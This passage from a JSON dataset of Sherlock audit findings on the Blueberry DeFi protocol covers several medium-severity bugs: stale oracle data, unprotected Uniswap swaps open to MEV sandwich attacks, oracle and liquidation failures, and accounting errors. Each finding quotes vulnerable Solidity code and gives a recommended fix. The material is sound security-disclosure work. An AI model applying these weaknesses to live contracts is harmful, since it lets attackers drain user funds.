reporting 0\");\n\n        if (updatedAt < block.timestamp - maxDelayTime)\n            revert PRICE_OUTDATED(_token);\n\n        return (answer.toUint256() * 1e18) / 10**decimals;\n    }\n```",
      "summary": "\nThis bug report is related to Chainlink's latestRoundData returning incorrect or stale results. The issue was found by 8olidity, tsvetanovv, WatchDogs, Nyx, Avci, obront, Aymen0909, SPYBOY, HonorLt, csanuragjain, koxuan, evan, rbserver, hl_, peanuts, and Chinmay. The code snippet for the vulnerability can be found at https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/ChainlinkAdapterOracle.sol#L76.\n\nThe vulnerability is that there is no check for the returned data from the latestRoundData to determine if it is stale. According to the Chainlink documentation, this could lead to stale prices. The impact of the vulnerability is that it could lead to incorrect prices being used, which could have serious implications for users.\n\nThe tool used to find the vulnerability was manual review. The recommendation is to add a check for the returned data to determine if it is stale. The code snippet for this is provided in the report. \n\nIn summary, this bug report is related to Chainlink's latestRoundData returning incorrect or stale results. The issue was found by multiple people and the tool used to detect it was manual review. The recommendation is to add a check for the returned data to determine if it is stale.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94",
      "tags": [
        "Stale Price",
        "Oracle",
        "Missing-Logic",
        "Data Validation"
      ],
      "finders": [
        "Avci",
        "csanuragjain",
        "8olidity",
        "WatchDogs",
        "rbserver",
        "Nyx",
        "koxuan",
        "Aymen0909",
        "tsvetanovv",
        "evan",
        "peanuts",
        "SPYBOY",
        "HonorLt",
        "obront",
        "hl\\_",
        "Chinmay"
      ]
    },
    {
      "id": "6658",
      "title": "M-11: Withdrawals from IchiVaultSpell have no slippage protection so can be frontrun, stealing all user funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/130 \n\n## Found by \nrvierdiiev, obront, koxuan, ctf\\_sec, tives, cergyk, berndartmueller, 0x52\n\n## Summary\n\nWhen a user withdraws their position through the `IchiVaultSpell`, part of the unwinding process is to trade one of the released tokens for the other, so the borrow can be returned. This trade is done on Uniswap V3. The parameters are set in such a way that there is no slippage protection, so any MEV bot could see this transaction, aggressively sandwich attack it, and steal the majority of the user's funds.\n\n## Vulnerability Detail\n\nUsers who have used the `IchiVaultSpell` to take positions in Ichi will eventually choose to withdraw their funds. They can do this by calling `closePosition()` or `closePositionFarm()`, both of which call to `withdrawInternal()`, which follows loosely the following logic:\n- sends the LP tokens back to the Ichi vault for the two underlying tokens (one of which was what was borrowed)\n- swaps the non-borrowed token for the borrowed token on UniV3, to ensure we will be able to pay the loan back\n- withdraw our underlying token from the Compound fork\n- repay the borrow token loan to the Compound fork\n- validate that we are still under the maxLTV for our strategy\n- send the funds (borrow token and underlying token) back to the user\n\nThe issue exists in the swap, where Uniswap is called with the following function:\n```solidity\nif (amountToSwap > 0) {\n    swapPool = IUniswapV3Pool(vault.pool());\n    swapPool.swap(\n        address(this),\n        !isTokenA,\n        int256(amountToSwap),\n        isTokenA\n            ? UniV3WrappedLibMockup.MAX_SQRT_RATIO - 1 \n            : UniV3WrappedLibMockup.MIN_SQRT_RATIO + 1, \n        abi.encode(address(this))\n    );\n}\n```\nThe 4th variable is called `sqrtPriceLimitX96` and it represents the square root of the lowest or highest price that you are willing to perform the trade at. In this case, we've hardcoded in that we are willing to take the worst possible rate (highest price in the event we are trading 1 => 0; lowest price in the event we are trading 0 => 1). \n\nThe `IchiVaultSpell.sol#uniswapV3SwapCallback()` function doesn't enforce any additional checks. It simply sends whatever delta is requested directly to Uniswap.\n```solidity\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external override {\n    if (msg.sender != address(swapPool)) revert NOT_FROM_UNIV3(msg.sender);\n    address payer = abi.decode(data, (address));\n\n    if (amount0Delta > 0) {\n        if (payer == address(this)) {\n            IERC20Upgradeable(swapPool.token0()).safeTransfer(\n                msg.sender,\n                uint256(amount0Delta)\n            );\n        } else {\n            IERC20Upgradeable(swapPool.token0()).safeTransferFrom(\n                payer,\n                msg.sender,\n                uint256(amount0Delta)\n            );\n        }\n    } else if (amount1Delta > 0) {\n        if (payer == address(this)) {\n            IERC20Upgradeable(swapPool.token1()).safeTransfer(\n                msg.sender,\n                uint256(amount1Delta)\n            );\n        } else {\n            IERC20Upgradeable(swapPool.token1()).safeTransferFrom(\n                payer,\n                msg.sender,\n                uint256(amount1Delta)\n            );\n        }\n    }\n}\n```\nWhile it is true that there is an `amountRepay` parameter that is inputted by the user, it is not sufficient to protect users. Many users will want to make only a small repayment (or no repayment) while unwinding their position, and thus this variable will only act as slippage protection in the cases where users intend to repay all of their returned funds.\n\nWith this knowledge, a malicious MEV bot could watch for these transactions in the mempool. When it sees such a transaction, it could perform a \"sandwich attack\", trading massively in the same direction as the trade in advance of it to push the price out of whack, and then trading back after us, so that they end up pocketing a profit at our expense.\n\nBecause many of the ICHI token pairs have small amounts of liquidity (for example, ICHI-WBTC has under $350k), such an attack could feasible take the majority of the funds, leaving the user with close to nothing. See more details on liquidity here: https://info.uniswap.org/#/tokens/0x111111517e4929d3dcbdfa7cce55d30d4b6bc4d6\n\n## Impact\n\nUsers withdrawing their funds through the `IchiVaultSpell` who do not plan to repay all of the tokens returned from Uniswap could be sandwich attacked, losing their funds by receiving very little of their borrowed token back from the swap.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L300-L317\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L407-L442\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nHave the user input a slippage parameter to ensure that the amount of borrowed token they receive back from Uniswap is in line with what they expect. \n\nAlternatively, use the existing oracle system to estimate a fair price and use that value in the `swap()` call.",
      "summary": "\nThis bug report is about an issue with the `IchiVaultSpell` in the Ichi protocol, which is used to withdraw user funds. When a user withdraws their position through the `IchiVaultSpell`, part of the unwinding process is to trade one of the released tokens for the other, so the borrow can be returned. This trade is done on Uniswap V3. Without slippage protection, any MEV bot could see this transaction and perform a \"sandwich attack\", trading massively in the same direction as the trade in advance of it to push the price out of whack, and then trading back after, so that they end up pocketing a profit at the user's expense. This could result in users losing their funds, as many of the ICHI token pairs have small amounts of liquidity.\n\nThe bug was found by rvierdiiev, obront, koxuan, ctf\\_sec, tives, cergyk, berndartmueller, and 0x52. It was found through manual review.\n\nThe recommendation is to have the user input a slippage parameter to ensure that the amount of borrowed token they receive back from Uniswap is in line with what they expect. Alternatively, use the existing oracle system to estimate a fair price and use that value in the `swap()` call.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/130",
      "tags": [
        "Slippage",
        "Front-Running"
      ],
      "finders": [
        "cergyk",
        "0x52",
        "koxuan",
        "berndartmueller",
        "tives",
        "rvierdiiev",
        "obront",
        "ctf\\_sec"
      ]
    },
    {
      "id": "6657",
      "title": "M-10: HardVault never deposits assets to Compound",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/147 \n\n## Found by \nobront, koxuan\n\n## Summary\n\nWhile the protocol states that all underlying assets are deposited to their Compound fork to earn interest, it appears this action never happens in `HardVault.sol`.\n\n## Vulnerability Detail\n\nThe documentation and comments seem to make clear that all assets deposited to `HardVault.sol` should be deposited to Compound to earn yield:\n\n```solidity\n/**\n    * @notice Deposit underlying assets on Compound and issue share token\n    * @param amount Underlying token amount to deposit\n    * @return shareAmount cToken amount\n    */\nfunction deposit(address token, uint256 amount) { ... }\n\n/**\n    * @notice Withdraw underlying assets from Compound\n    * @param shareAmount Amount of cTokens to redeem\n    * @return withdrawAmount Amount of underlying assets withdrawn\n    */\nfunction withdraw(address token, uint256 shareAmount) { ... }\n```\nHowever, if we examine the code in these functions, there is no movement of the assets to Compound. Instead, they sit in the Hard Vault and doesn't earn any yield.\n\n## Impact\n\nUsers who may expect to be earning yield on their underlying tokens will not be.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/vault/HardVault.sol#L68-L116\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEither add the functionality to the Hard Vault to have the assets pulled from the ERC1155 and deposited to the Compound fork, or change the comments and docs to be clear that such underlying assets will not be receiving any yield.",
      "summary": "\nThis bug report is about the HardVault protocol, which is a part of the Sherlock Audit 2023-02-blueberry-judging project. The protocol states that all underlying assets should be deposited to their Compound fork to earn interest. However, when the code in the deposit and withdraw functions was examined, it was found that there was no movement of the assets to Compound, meaning users were not earning yield on their underlying tokens. This bug was found and reported by obront and koxuan.\n\nThe code snippet linked in the report can be found at https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/vault/HardVault.sol#L68-L116. The tool used to find the bug was manual review.\n\nThe impact of this bug is that users of the HardVault protocol are not earning yield on their underlying tokens. To fix the issue, the Hard Vault should be updated to have the assets pulled from the ERC1155 and deposited to the Compound fork, or the comments and documentation should be changed to make it clear that such underlying assets will not be receiving any yield.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/147",
      "tags": [],
      "finders": [
        "obront",
        "koxuan"
      ]
    },
    {
      "id": "6656",
      "title": "M-9: LP tokens cannot be valued because ICHI cannot be priced by oracle, causing all new open positions to revert",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/152 \n\n## Found by \nobront\n\n## Summary\n\nIn order to value ICHI LP tokens, the oracle uses the Fair LP Pricing technique, which uses the prices of both individual tokens, along with the quantities, to calculate the LP token value. However, this process requires the underlying token prices to be accessible by the oracle. Both Chainlink and Band do not support the ICHI token, so the function will fail, causing all new positions using the IchiVaultSpell to revert.\n\n## Vulnerability Detail\n\nWhen a new Ichi position is opened, the ICHI LP tokens are posted as collateral. Their value is assessed using the `IchiLpOracle#getPrice()` function:\n\n```solidity\nfunction getPrice(address token) external view override returns (uint256) {\n    IICHIVault vault = IICHIVault(token);\n    uint256 totalSupply = vault.totalSupply();\n    if (totalSupply == 0) return 0;\n\n    address token0 = vault.token0();\n    address token1 = vault.token1();\n\n    (uint256 r0, uint256 r1) = vault.getTotalAmounts();\n    uint256 px0 = base.getPrice(address(token0));\n    uint256 px1 = base.getPrice(address(token1));\n    uint256 t0Decimal = IERC20Metadata(token0).decimals();\n    uint256 t1Decimal = IERC20Metadata(token1).decimals();\n\n    uint256 totalReserve = (r0 * px0) /\n        10**t0Decimal +\n        (r1 * px1) /\n        10**t1Decimal;\n\n    return (totalReserve * 1e18) / totalSupply;\n}\n```\nThis function uses the \"Fair LP Pricing\" formula, made famous by Alpha Homora. To simplify, this uses an oracle to get the prices of both underlying tokens, and then calculates the LP price based on these values and the reserves.\n\nHowever, this process requires that we have a functioning oracle for the underlying tokens. However, [Chainlink](https://data.chain.link/) and [Band](https://data.bandprotocol.com/) both do not support the ICHI token (see the links for their comprehensive lists of data feeds). As a result, the call to `base.getPrice(token0)` will fail.\n\nAll prices are calculated in the `isLiquidatable()` check at the end of the `execute()` function. As a result, any attempt to open a new ICHI position and post the LP tokens as collateral (which happens in both `openPosition()` and `openPositionFarm()`) will revert.\n\n## Impact\n\nAll new positions opened using the `IchiVaultSpell`  will revert when they attempt to look up the LP token price, rendering the protocol useless.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/IchiLpOracle.sol#L19-L39\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere will need to be an alternate form of oracle that can price the ICHI token. The best way to accomplish this is likely to use a TWAP of the price on an AMM.\n\n## Discussion\n\n**Gornutz**\n\nThere is additional oracles for assets not supported by chainlink or band but just not in scope of this specific audit.\n\n**hrishibhat**\n\nBased on the context there are no implementations for getting the price of the ICHI token. Considering this a valid issue. \n\n\n**SergeKireev**\n\nEscalate for 31 USDC\n\nImpact stated is medium, since positions cannot be opened and no funds are at risk.\nThe high severity definition as stated per Sherlock docs:\n\n>This vulnerability would result in a material loss of funds and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\n\n**sherlock-admin**\n\n > Escalate for 31 USDC\n> \n> Impact stated is medium, since positions cannot be opened and no funds are at risk.\n> The high severity definition as stated per Sherlock docs:\n> \n> >This vulnerability would result in a material loss of funds and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\n\nYou've created a valid escalation for 31 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nThis is a valid medium\nAlso Given that this is an issue only for the Ichi tokens and impact is only unable to open positions.\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> This is a valid medium\n> Also Given that this is an issue only for the Ichi tokens and impact is only unable to open positions.\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the inability of LP tokens to be valued due to the lack of support for the ICHI token by oracle services like Chainlink and Band. This results in all new open positions using the IchiVaultSpell to revert.\n\nThe issue lies with the `IchiLpOracle#getPrice()` function, which uses the Fair LP Pricing technique to calculate the LP token value. It requires an oracle to get the prices of both underlying tokens, and then calculates the LP price based on these values and the reserves. However, since Chainlink and Band do not support the ICHI token, the call to `base.getPrice(token0)` will fail.\n\nThis issue is only for the ICHI tokens and the impact is that new positions cannot be opened. The severity is medium, since positions cannot be opened and no funds are at risk. The recommended solution is to use a TWAP of the price on an AMM as an alternative form of oracle. The issue has been accepted as valid, and contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/152",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "6655",
      "title": "M-8: Complete debt size is not paid off for fee on transfer tokens, but users aren't warned",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/153 \n\n## Found by \ntsvetanovv, rvierdiiev, Avci, obront, chaduke, berndartmueller, Breeje\n\n## Summary\n\nThe protocol seems to be intentionally catering to fee on transfer tokens by measuring token balances before and after transfers to determine the value received. However, the mechanism to pay the full debt will not succeed in paying off the debt if it is used with a fee on transfer token.\n\n## Vulnerability Detail\n\nThe protocol is clearly designed to ensure it is compatible with fee on transfer tokens. For example, all functions that receive tokens check the balance before and after, and calculate the difference between these values to measure tokens received:\n```solidity\nfunction doERC20TransferIn(address token, uint256 amountCall)\n    internal\n    returns (uint256)\n{\n    uint256 balanceBefore = IERC20Upgradeable(token).balanceOf(\n        address(this)\n    );\n    IERC20Upgradeable(token).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amountCall\n    );\n    uint256 balanceAfter = IERC20Upgradeable(token).balanceOf(\n        address(this)\n    );\n    return balanceAfter - balanceBefore;\n}\n```\n\nThere is another feature of the protocol, which is that when loans are being repaid, the protocol gives the option of passing `type(uint256).max` to pay your debt in full:\n```solidity\nif (amountCall == type(uint256).max) {\n    amountCall = oldDebt;\n}\n```\nHowever, these two features are not compatible. If a user paying off fee on transfer tokens passes in `type(uint256).max` to pay their debt in full, the full amount of their debt will be calculated. But when that amount is transferred to the contract, the amount that the result increases will be slightly less. As a result, the user will retain some balance that is not paid off.\n\n## Impact\n\nThe feature to allow loans to be paid in full will silently fail when used with fee on transfer tokens, which may trick users into thinking they have completely paid off their loans, and accidentally maintaining a balance.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L760-L775\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI understand that it would be difficult to implement a mechanism to pay fee on transfer tokens off in full. That adds a lot of complexity that is somewhat fragile.\n\nThe issue here is that the failure is silent, so that users request to pay off their loan in full, get confirmation, and may not realize that the loan still has an outstanding balance with interest accruing.\n\nTo solve this, there should be a confirmation that any user who passes `type(uint256).max` has paid off their debt in full. Otherwise, the function should revert, so that users paying fee on transfer tokens know that they cannot use the \"pay in full\" feature and must specify the correct amount to get their outstanding balance down to zero.",
      "summary": "\nThis bug report is about the protocol of a loan repayment system that is not compatible with fee on transfer tokens. When users pass the maximum value to pay off their loan in full, the protocol does not warn them that the debt will not be paid off completely. This could lead to users mistakenly thinking that their debt is paid off, when in fact, there is still an outstanding balance with interest accruing. The bug was found by tsvetanovv, rvierdiiev, Avci, obront, chaduke, berndartmueller, and Breeje, and was manually reviewed. To solve this issue, the protocol should provide a confirmation that any user who passes the maximum value has paid off their debt in full, or the function should revert so that users paying fee on transfer tokens know that they cannot use the \"pay in full\" feature and must specify the correct amount to get their outstanding balance down to zero.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/153",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "Avci",
        "tsvetanovv",
        "berndartmueller",
        "chaduke",
        "Breeje",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "6654",
      "title": "M-7: totalLend isn't updated on liquidation, leading to permanently inflated value",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/155 \n\n## Found by \nberndartmueller, obront, SPYBOY, cducrest-brainbot\n\n## Summary\n\n`bank.totalLend` tracks the total amount that has been lent of a given token, but it does not account for tokens that are withdrawn when a position is liquidated. As a result, the value will become overstated, leading to inaccurate data on the pool.\n\n## Vulnerability Detail\n\nWhen a user lends a token to the Compound fork, the bank for that token increases its `totalLend` parameter:\n```solidity\nbank.totalLend += amount;\n```\nSimilarly, this value is decreased when the amount is withdrawn.\n\nIn the event that a position is liquidated, the `underlyingAmount` and `underlyingVaultShare` for the user are decreased based on the amount that will be transferred to the liquidator.\n```solidity\nuint256 liqSize = (pos.collateralSize * share) / oldShare;\nuint256 uTokenSize = (pos.underlyingAmount * share) / oldShare;\nuint256 uVaultShare = (pos.underlyingVaultShare * share) / oldShare;\n\npos.collateralSize -= liqSize;\npos.underlyingAmount -= uTokenSize;\npos.underlyingVaultShare -= uVaultShare;\n```\n\nHowever, the liquidator doesn't receive those shares \"inside the system\". Instead, they receive the softVault tokens that can be claimed directly for the underlying asset by calling `withdraw()`, which simply redeems the underlying tokens from the Compound fork and sends them to the user.\n```solidity\nfunction withdraw(uint256 shareAmount)\n    external\n    override\n    nonReentrant\n    returns (uint256 withdrawAmount)\n{\n    if (shareAmount == 0) revert ZERO_AMOUNT();\n\n    _burn(msg.sender, shareAmount);\n\n    uint256 uBalanceBefore = uToken.balanceOf(address(this));\n    if (cToken.redeem(shareAmount) != 0) revert REDEEM_FAILED(shareAmount);\n    uint256 uBalanceAfter = uToken.balanceOf(address(this));\n\n    withdrawAmount = uBalanceAfter - uBalanceBefore;\n    // Cut withdraw fee if it is in withdrawVaultFee Window (2 months)\n    if (\n        block.timestamp <\n        config.withdrawVaultFeeWindowStartTime() +\n            config.withdrawVaultFeeWindow()\n    ) {\n        uint256 fee = (withdrawAmount * config.withdrawVaultFee()) /\n            DENOMINATOR;\n        uToken.safeTransfer(config.treasury(), fee);\n        withdrawAmount -= fee;\n    }\n    uToken.safeTransfer(msg.sender, withdrawAmount);\n\n    emit Withdrawn(msg.sender, withdrawAmount, shareAmount);\n}\n```\n\nNowhere in this process is `bank.totalLend` updated. As a result, each time there is a liquidation of size X, `bank.totalLend` will move X higher relative to the correct value. Slowly, over time, this value will begin to dramatically misrepresent the accurate amount that has been lent.\n\nWhile there is no material exploit based on this inaccuracy at the moment, this is a core piece of data in the protocol, and it's inaccuracy could lead to major issues down the road. \n\nFurthermore, it will impact immediate user behavior, as the Blueberry devs have explained \"we use that [value] to help us display TVL with subgraph\", which will deceive and confuse users.\n\n## Impact\n\nA core metric of the protocol will be permanently inaccurate, giving users incorrect data to make their assessments on and potentially causing more severe issues down the road.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L511-L572\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/vault/SoftVault.sol#L94-L123\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nFor the best accuracy, updating `bank.totalLend` should happen from the `withdraw()` function in `SoftVault.sol` instead of from the core `BlueberryBank.sol` contract.\n\nAlternatively, you could add an update to `bank.totalLend` in the `liquidate()` function, which might temporarily underrepresent the total lent before the liquidator withdrew the funds, but would end up being accurate over the long run.",
      "summary": "\nThis bug report is about an issue with the `bank.totalLend` parameter in the Compound fork, which tracks the total amount that has been lent of a given token. This parameter does not account for tokens that are withdrawn when a position is liquidated, leading to an overstated value and inaccurate data on the pool. This inaccuracy could lead to major issues down the road and will also impact user behavior. \n\nFour developers - berndartmueller, obront, SPYBOY, and cducrest-brainbot - found this vulnerability through manual review. The code snippets of the relevant contracts can be found at the given links. \n\nThe recommendation is to update the `bank.totalLend` parameter from the `withdraw()` function in `SoftVault.sol` for the best accuracy. Alternatively, one could add an update to `bank.totalLend` in the `liquidate()` function, which might temporarily underrepresent the total lent before the liquidator withdrew the funds, but would end up being accurate over the long run.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/155",
      "tags": [],
      "finders": [
        "berndartmueller",
        "obront",
        "cducrest-brainbot",
        "SPYBOY"
      ]
    },
    {
      "id": "6653",
      "title": "M-6: If a token's oracle goes down or price falls to zero, liquidations will be frozen",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/161 \n\n## Found by \n8olidity, 0xChinedu, rvierdiiev, obront, sakshamguruji, Saeedalipoor01988\n\n## Summary\n\nIn some extreme cases, oracles can be taken offline or token prices can fall to zero. In these cases, liquidations will be frozen (all calls will revert) for any debt holders holding this token, even though they may be some of the most important times to allow liquidations to retain the solvency of the protocol.\n\n## Vulnerability Detail\n\nChainlink has taken oracles offline in extreme cases. For example, during the UST collapse, Chainlink paused the UST/ETH price oracle, to ensure that it wasn't providing inaccurate data to protocols.\n\nIn such a situation (or one in which the token's value falls to zero), all liquidations for users holding the frozen asset would revert. This is because any call to `liquidate()` calls `isLiquidatable()`, which calls `getPositionRisk()`, which calls the oracle to get the values of all the position's tokens (underlying, debt, and collateral).\n\nDepending on the specifics, one of the following checks would cause the revert:\n- the call to Chainlink's `registry.latestRoundData` would fail\n- `if (updatedAt < block.timestamp - maxDelayTime) revert PRICE_OUTDATED(_token);`\n- `if (px == 0) revert PRICE_FAILED(token);`\n\nIf the oracle price lookup reverts, liquidations will be frozen, and the user will be immune to liquidations. Although there are ways this could be manually fixed with fake oracles, by definition this happening would represent a cataclysmic time where liquidations need to be happening promptly to avoid the protocol falling into insolvency. \n\n## Impact\n\nLiquidations may not be possible at a time when the protocol needs them most. As a result, the value of user's asset may fall below their debts, turning off any liquidation incentive and pushing the protocol into insolvency.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L511-L517\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L497-L505\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L477-L488\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/CoreOracle.sol#L182-L189\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/CoreOracle.sol#L95-L99\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/oracle/ChainlinkAdapterOracle.sol#L66-L84\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEnsure there is a safeguard in place to protect against this possibility.",
      "summary": "\nThis bug report is about an issue where liquidations will be frozen if a token's oracle goes down or its price falls to zero. This was found by 8olidity, 0xChinedu, rvierdiiev, obront, sakshamguruji, and Saeedalipoor01988. \n\nWhen an oracle is taken offline, such as during the UST collapse, the call to `liquidate()` will revert due to a call to `isLiquidatable()` which calls `getPositionRisk()`, which calls the oracle to get the values of all the position's tokens (underlying, debt, and collateral). This can be seen in the code snippets provided.\n\nThe impact of this issue is that liquidations may not be possible at a time when the protocol needs them most. This could turn off any liquidation incentive and push the protocol into insolvency. \n\nThe recommendation is to ensure there is a safeguard in place to protect against this possibility. The tool used to find this bug was manual review.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/161",
      "tags": [],
      "finders": [
        "8olidity",
        "0xChinedu",
        "sakshamguruji",
        "rvierdiiev",
        "obront",
        "Saeedalipoor01988"
      ]
    },
    {
      "id": "6652",
      "title": "M-5: `BlueBerryBank.withdrawLend` function cannot be paused",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/204 \n\n## Found by \nrbserver\n\n## Summary\nWhen an extreme market condition occurs, the protocol faces an exploit, or the authority issues a legal requirement, the protocol is able to pause the lending, borrowing, and repaying functionalities. However, the protocol is unable to pause the functionality for reducing a position.\n\n## Vulnerability Detail\nBecause the `BlueBerryBank` contract does not have a function, which is like `BlueBerryBank.isBorrowAllowed`, `BlueBerryBank.isRepayAllowed`, and `BlueBerryBank.isLendAllowed`, for pausing the functionality for reducing a position, the `BlueBerryBank.withdrawLend` function, which is shown in the Code Snippet section, cannot be paused. Users can still call the `IchiVaultSpell.reducePosition` function that further calls the `BlueBerryBank.withdrawLend` function to reduce a position when there is a need for pausing this functionality.\n\n## Impact\nJust like pausing the lending, borrowing, and repaying functionalities, it is possible that the protocol needs to pause the functionality for reducing a position. However, when this need occurs, users can still reduce their positions through calling the `IchiVaultSpell.reducePosition` and `BlueBerryBank.withdrawLend` functions. The protocol cannot stop the outflow of the funds due to these position reductions even it is required to do so in this situation.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/spell/IchiVaultSpell.sol#L266-L274\n```solidity\n    function reducePosition(\n        uint256 strategyId,\n        address collToken,\n        uint256 collAmount\n    ) external {\n        doWithdraw(collToken, collAmount);\n        doRefund(collToken);\n        _validateMaxLTV(strategyId);\n    }\n```\n\nhttps://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L669-L704\n```solidity\n    function withdrawLend(address token, uint256 shareAmount)\n        external\n        override\n        inExec\n        poke(token)\n    {\n        Position storage pos = positions[POSITION_ID];\n        Bank storage bank = banks[token];\n        if (token != pos.underlyingToken) revert INVALID_UTOKEN(token);\n        if (shareAmount == type(uint256).max) {\n            shareAmount = pos.underlyingVaultShare;\n        }\n\n        uint256 wAmount;\n        if (address(ISoftVault(bank.softVault).uToken()) == token) {\n            ISoftVault(bank.softVault).approve(\n                bank.softVault,\n                type(uint256).max\n            );\n            wAmount = ISoftVault(bank.softVault).withdraw(shareAmount);\n        } else {\n            wAmount = IHardVault(bank.hardVault).withdraw(token, shareAmount);\n        }\n\n        wAmount = wAmount > pos.underlyingAmount\n            ? pos.underlyingAmount\n            : wAmount;\n\n        pos.underlyingVaultShare -= shareAmount;\n        pos.underlyingAmount -= wAmount;\n        bank.totalLend -= wAmount;\n\n        wAmount = doCutWithdrawFee(token, wAmount);\n\n        IERC20Upgradeable(token).safeTransfer(msg.sender, wAmount);\n    }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\nA function, which is similar to the `BlueBerryBank.isBorrowAllowed`, `BlueBerryBank.isRepayAllowed`, and `BlueBerryBank.isLendAllowed` functions, can be added in the `BlueBerryBank` contract for pausing the `BlueBerryBank.withdrawLend` function. This function can then be used in the `BlueBerryBank.withdrawLend` function so the `BlueBerryBank.withdrawLend` function can be paused when needed.",
      "summary": "\nA bug was found in the `BlueBerryBank.withdrawLend` function of the `BlueBerryBank` contract. This function, which is used to reduce a position, cannot be paused when an extreme market condition occurs, an exploit is faced, or a legal requirement is issued. This means that users can still reduce their positions even when the protocol needs to pause this functionality. A function similar to the `BlueBerryBank.isBorrowAllowed`, `BlueBerryBank.isRepayAllowed`, and `BlueBerryBank.isLendAllowed` functions can be added in the `BlueBerryBank` contract for pausing the `BlueBerryBank.withdrawLend` function. This function can then be used to pause the `BlueBerryBank.withdrawLend` function when needed.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/204",
      "tags": [],
      "finders": [
        "rbserver"
      ]
    },
    {
      "id": "6651",
      "title": "M-4: Deposit Theft by Crashing LP Spot Prices Through MEV",
